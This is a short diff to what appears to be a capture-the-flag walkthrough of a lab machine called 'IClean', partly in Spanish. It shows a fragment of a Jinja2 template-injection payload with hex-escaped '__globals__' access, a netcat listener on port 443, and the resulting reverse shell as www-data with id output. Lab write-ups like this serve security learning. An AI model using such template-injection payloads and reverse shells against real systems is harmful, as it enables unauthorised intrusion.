@@ -293,3 +293,23 @@ Final Payload -> {{request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')|a
 ![19](../../../assets/images/IClean/19.png)
 
 <br />
+
+We receive the Reverse Shell as the user www-data:
+
+<br />
+
+```bash
+❯ sudo nc -nlvp 443
+[sudo] contraseña para theredp4nther: 
+listening on [any] 443 ...
+connect to [10.10.14.13] from (UNKNOWN) [10.10.11.12] 36868
+bash: cannot set terminal process group (1227): Inappropriate ioctl for device
+bash: no job control in this shell
+www-data@iclean:/opt/app$ id
+id
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+www-data@iclean:/opt/app$ 
+
+```
+
+<br />
